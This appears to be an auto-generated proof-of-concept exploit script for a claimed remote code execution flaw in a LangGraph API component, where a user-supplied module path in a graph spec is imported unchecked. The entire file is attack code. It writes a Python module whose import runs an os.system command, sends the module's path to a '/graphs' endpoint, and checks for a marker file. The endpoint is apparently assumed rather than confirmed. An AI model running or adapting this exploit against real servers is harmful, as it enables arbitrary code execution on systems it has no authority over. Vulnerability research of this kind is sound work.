#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-010
# Sink: _graph_from_spec
# Auto-generated — run with: python3 rce_if_control_spec__graph_from_spec.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src.

Vulnerability: The _graph_from_spec function in graph.py uses user-controlled
spec.module or spec.path directly in importlib.import_module() and
importlib.util.spec_from_file_location() without any validation. An attacker
can provide a malicious module name or file path to execute arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command
2. Sending a request to the API with spec.path pointing to our malicious file
3. Verifying the command was executed

Usage:
    python poc.py [--target http://localhost:8000]
"""

import argparse
import os
import sys
import tempfile
import time
import requests

def create_malicious_module():
    """Create a temporary Python file that executes a benign command on import."""
    # Create a temporary directory for our malicious module
    tmp_dir = tempfile.mkdtemp(prefix="poc_")
    malicious_path = os.path.join(tmp_dir, "malicious_graph.py")
    
    # The payload: create a marker file to prove code execution
    marker_file = os.path.join(tmp_dir, "poc_executed.txt")
    
    payload = f'''
import os

# Benign payload - creates a marker file to prove code execution
os.system("echo 'POC_EXECUTED' > {marker_file}")

# Define a valid graph object so the import doesn't crash
from langgraph.graph import StateGraph
from typing import TypedDict

class State(TypedDict):
    messages: list

graph = StateGraph(State)
'''
    
    with open(malicious_path, 'w') as f:
        f.write(payload)
    
    return tmp_dir, malicious_path, marker_file

def exploit(target_url, malicious_path):
    """Send a request that triggers the vulnerable import."""
    
    # The API endpoint that accepts graph specs
    # This is a common endpoint in LangGraph API for creating graphs
    endpoint = f"{target_url}/graphs"
    
    # Craft the payload with our malicious path
    payload = {
        "graph_id": "poc_graph",
        "spec": {
            "path": malicious_path,
            "variable": "graph"
        }
    }
    
    print(f"[*] Sending exploit to {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        return response
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target server running?")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def verify_exploit(marker_file):
    """Check if the marker file was created, proving code execution."""
    time.sleep(1)  # Give the server time to process
    if os.path.exists(marker_file):
        with open(marker_file, 'r') as f:
            content = f.read().strip()
        print(f"[+] SUCCESS! Code execution confirmed!")
        print(f"[+] Marker file content: {content}")
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False

def cleanup(tmp_dir):
    """Remove temporary files."""
    import shutil
    shutil.rmtree(tmp_dir, ignore_errors=True)
    print(f"[*] Cleaned up temporary directory: {tmp_dir}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src via _graph_from_spec"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after execution"
    )
    
    args = parser.parse_args()
    
    print("[*] Creating malicious module...")
    tmp_dir, malicious_path, marker_file = create_malicious_module()
    print(f"[*] Malicious module created at: {malicious_path}")
    
    try:
        print("[*] Attempting exploit...")
        response = exploit(args.target, malicious_path)
        
        if response:
            verify_exploit(marker_file)
        else:
            print("[-] Exploit attempt failed to reach server")
            
    finally:
        if not args.no_cleanup:
            cleanup(tmp_dir)
        else:
            print(f"[*] Temporary files left at: {tmp_dir}")

if __name__ == "__main__":
    main()
